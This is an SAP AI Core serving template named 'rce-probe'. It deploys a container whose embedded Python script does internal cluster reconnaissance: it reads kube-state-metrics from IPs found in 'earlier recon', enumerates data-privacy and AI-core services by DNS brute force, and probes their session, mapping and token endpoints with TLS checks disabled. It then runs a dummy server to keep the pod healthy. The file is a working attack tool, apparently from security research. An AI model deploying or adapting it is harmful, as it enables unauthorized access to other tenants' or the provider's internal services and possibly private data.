apiVersion: ai.sap.com/v1alpha1
kind: ServingTemplate
metadata:
  name: rce-probe
  labels:
    scenarios.ai.sap.com/id: "rce-probe"
    ai.sap.com/version: "58.0.0"
  annotations:
    scenarios.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/description: "dpi-probe"
spec:
  template:
    apiVersion: "serving.kserve.io/v1beta1"
    metadata:
      annotations: |
        autoscaling.knative.dev/target: 1
      labels: |
        ai.sap.com/resourcePlan: starter
    spec: |
      predictor:
        minReplicas: 1
        maxReplicas: 1
        containers:
        - name: kserve-container
          image: python:3.11
          command: ["/bin/sh", "-c"]
          args:
          - |
            python3 -c "
            import urllib.request, ssl, json, socket, re

            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            results = {}

            # Known KSM IPs from earlier recon - fetch metrics to find DPI service
            KSM_IPS = [
                '100.110.128.70',   # ksm-multi
                '100.110.192.195',  # ksm-custom
            ]

            # Grep metrics for DPI/privacy/masking related services
            dpi_services = {}
            for ksm_ip in KSM_IPS:
                try:
                    url = f'http://{ksm_ip}:8080/metrics'
                    req = urllib.request.Request(url)
                    with urllib.request.urlopen(req, timeout=10) as r:
                        metrics = r.read().decode(errors='replace')
                    # Find any service with dpi/privacy/masking/anonymi keywords
                    for line in metrics.split('\n'):
                        if any(kw in line.lower() for kw in ['dpi', 'privacy', 'masking', 'anonymi', 'pseudonym', 'data_priv']):
                            results[f'ksm_{ksm_ip}_match'] = results.get(f'ksm_{ksm_ip}_match', [])
                            results[f'ksm_{ksm_ip}_match'].append(line.strip()[:200])
                    # Also extract service ClusterIPs from kube_service_info metrics
                    # Format: kube_service_info{namespace=\"...\",service=\"...\",cluster_ip=\"...\"}
                    import re as re_mod
                    for m in re_mod.finditer(r'kube_service_info\{[^}]*service=\"([^\"]+)\"[^}]*cluster_ip=\"([^\"]+)\"[^}]*namespace=\"([^\"]+)\"', metrics):
                        svc, ip, ns = m.group(1), m.group(2), m.group(3)
                        if any(kw in svc.lower() or kw in ns.lower() for kw in ['dpi', 'privacy', 'masking', 'anonymi', 'pseudonym']):
                            dpi_services[f'{ns}/{svc}'] = ip
                    # Also look for 'ai-api', 'aicore', 'ai-core' services
                    for m in re_mod.finditer(r'kube_service_info\{[^}]*service=\"([^\"]+)\"[^}]*cluster_ip=\"([^\"]+)\"[^}]*namespace=\"([^\"]+)\"', metrics):
                        svc, ip, ns = m.group(1), m.group(2), m.group(3)
                        if any(kw in svc.lower() or kw in ns.lower() for kw in ['ai-api', 'aicore', 'ai-core', 'ml-api', 'orchestrat', 'sap-ai']):
                            dpi_services[f'aicore:{ns}/{svc}'] = ip
                except Exception as e:
                    results[f'ksm_{ksm_ip}_err'] = str(e)[:80]

            results['dpi_services_discovered'] = dpi_services

            # DNS probe: try common DPI service names across likely namespaces
            namespaces = ['default', 'sap-dpi', 'dpi', 'privacy', 'data-privacy',
                         'sap-ai-core', 'aicore', 'ai-core', 'ml-foundation',
                         'sap-data-privacy', 'anonymization', 'masking']
            service_names = ['sap-data-privacy-integration', 'data-privacy-integration',
                            'dpi-service', 'dpi', 'privacy-service', 'anonymization-service',
                            'masking-service', 'sap-dpi', 'aicore-dpi',
                            'genai-dpi', 'orchestration-dpi']

            for ns in namespaces:
                for svc in service_names:
                    hostname = f'{svc}.{ns}.svc.cluster.local'
                    try:
                        ip = socket.getaddrinfo(hostname, None)[0][4][0]
                        dpi_services[hostname] = ip
                        results[f'dns_{hostname}'] = ip
                    except:
                        pass

            results['all_discovered'] = dpi_services

            # Probe any discovered services
            for name, ip in dpi_services.items():
                if ip in ['None', 'none', ''] or not ip:
                    continue
                for port in [80, 443, 8080, 8443]:
                    for path in ['/healthz', '/api/v1/sessions', '/api/v1/mappings',
                                '/api/sessions', '/sessions', '/mappings', '/tokens',
                                '/api/v1', '/api', '/v1/dpi', '/dpi']:
                        for scheme in ['http', 'https']:
                            url = f'{scheme}://{ip}:{port}{path}'
                            try:
                                req = urllib.request.Request(url, headers={'Accept': 'application/json'})
                                with urllib.request.urlopen(req, timeout=3, context=ctx) as r:
                                    body = r.read(2000).decode(errors='replace')
                                    key = f'{name}:{port}{path}'
                                    results[key] = {'code': r.status, 'body': body[:500]}
                                    break
                            except urllib.error.HTTPError as e:
                                body = ''
                                try: body = e.read(500).decode(errors='replace')
                                except: pass
                                if e.code not in [404]:
                                    results[f'{name}:{port}{path}'] = {'code': e.code, 'body': body[:200]}
                            except Exception as ex:
                                err = str(ex)[:50]
                                if 'timed out' not in err and '111' not in err and '104' not in err:
                                    results[f'{name}:{port}{path}_err'] = err

            print('[DPI_PROBE_START]')
            print(json.dumps(results, indent=2, default=str))
            print('[DPI_PROBE_END]')
            " 2>&1
            python3 -c "
            import http.server
            class H(http.server.BaseHTTPRequestHandler):
                def do_GET(self): self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
                def log_message(self, *a): pass
            http.server.HTTPServer(('', 8080), H).serve_forever()
            "
